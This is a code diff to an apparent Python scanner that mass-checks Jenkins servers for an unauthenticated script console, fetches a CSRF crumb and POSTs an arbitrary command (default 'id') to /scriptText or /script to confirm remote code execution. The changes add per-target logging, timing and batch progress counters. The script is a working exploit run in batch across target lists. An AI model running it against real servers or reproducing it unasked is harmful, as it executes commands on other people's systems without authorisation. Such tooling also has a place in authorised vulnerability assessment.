@@ -6,6 +6,7 @@ import os
 import re
 import ssl
 import sys
+import time
 from collections import Counter
 from datetime import datetime
 from http.cookiejar import CookieJar
@@ -78,27 +79,39 @@ def parse_proof(text):
     return html.unescape(re.sub(r"<[^>]+>", "", text)).strip()[:2000]
 
 
-def check_target(target, cmd="id", timeout=15):
+def check_target(target, cmd="id", timeout=15, prefix=""):
     base = normalize(target)
+    started = time.time()
+
+    def log(msg):
+        print("%s%s" % (prefix, msg), flush=True)
+
+    log(base)
     op, _ = opener()
+    log("  GET / ...")
     root_code, root_hdr, root_body = fetch(base + "/", timeout, op)
+    log("  GET / -> %s" % root_code)
     lower_hdr = {k.lower(): v for k, v in root_hdr.items()}
     version = lower_hdr.get("x-jenkins", "")
     if not version:
         found = re.search(r"Dashboard\s*-\s*Jenkins|Jenkins\s+\d+\.\d+", root_body, re.I)
         version = found.group(0) if found else ""
     is_jenkins = bool(version) or "x-hudson" in lower_hdr or "Dashboard - Jenkins" in root_body
+    log("  Jenkins=%s version=%s" % (is_jenkins, version or "-"))
 
     codes = {}
     bodies = {}
     for name, path in ENDPOINTS.items():
+        log("  GET %s ..." % path)
         code, _, body = fetch(base + path, timeout, op)
+        log("  GET %s -> %s" % (path, code))
         codes[name] = code
         bodies[name] = body
 
     script_anon = bool(re.search(r"name=[\"']script[\"']", bodies["script"], re.I))
     if not script_anon and codes["scriptText"] == 200 and "script" in bodies["scriptText"].lower():
         script_anon = True
+    log("  anonymous_script_console=%s" % script_anon)
 
     crumb = ""
     if codes["crumbIssuer"] == 200:
@@ -111,8 +124,10 @@ def check_target(target, cmd="id", timeout=15):
     proof_endpoint = None
     if script_anon and crumb:
         cop, _ = opener(with_cookies=True)
+        log("  getting crumb ...")
         fetch(base + "/crumbIssuer/api/json", timeout, cop)
         _, _, crumb_body = fetch(base + "/crumbIssuer/api/json", timeout, cop)
+        log("  crumb=%s" % ("ok" if crumb else "failed"))
         try:
             crumb = json.loads(crumb_body).get("crumb", crumb)
         except (ValueError, AttributeError):
@@ -121,11 +136,12 @@ def check_target(target, cmd="id", timeout=15):
         headers = {"Jenkins-Crumb": crumb, "Content-Type": "application/x-www-form-urlencoded"}
         if codes["scriptText"] == 200:
             proof_endpoint = "/scriptText"
-            _, _, out = fetch(base + "/scriptText", timeout, cop, data=data, headers=headers)
         else:
             proof_endpoint = "/script"
-            _, _, out = fetch(base + "/script", timeout, cop, data=data, headers=headers)
+        log("  POST %s (%s) ..." % (proof_endpoint, cmd))
+        _, _, out = fetch(base + proof_endpoint, timeout, cop, data=data, headers=headers)
         proof = parse_proof(out)
+        log("  proof=%s" % (proof or "empty"))
 
     if not is_jenkins:
         verdict = "not_jenkins"
@@ -135,6 +151,7 @@ def check_target(target, cmd="id", timeout=15):
         verdict = "rce_confirmed"
     else:
         verdict = "script_console_anonymous_proof_failed"
+    log("  verdict=%s (%.1fs)" % (verdict, time.time() - started))
 
     return {
         "url": base,
@@ -195,13 +212,14 @@ def main():
         with open(batch_out, "w", encoding="utf-8"):
             pass
 
-    for target in targets:
-        result = check_target(target, args.cmd, args.timeout)
+    for i, target in enumerate(targets, 1):
+        prefix = "[%d/%d] " % (i, len(targets)) if batch else ""
+        result = check_target(target, args.cmd, args.timeout, prefix)
         out = write_json(result, None if batch else args.output)
         if batch:
             with open(batch_out, "a", encoding="utf-8") as f:
                 f.write(json.dumps(result, ensure_ascii=False) + "\n")
-            print("%s\t%s\t%s" % (result["verdict"], result["version"] or "-", result["url"]))
+            print("%s%s\t%s\t%s" % (prefix, result["verdict"], result["version"] or "-", result["url"]), flush=True)
         else:
             print("Отчёт: %s" % out)
             print("  jenkins=%s  version=%s" % (result["is_jenkins"], result["version"]))
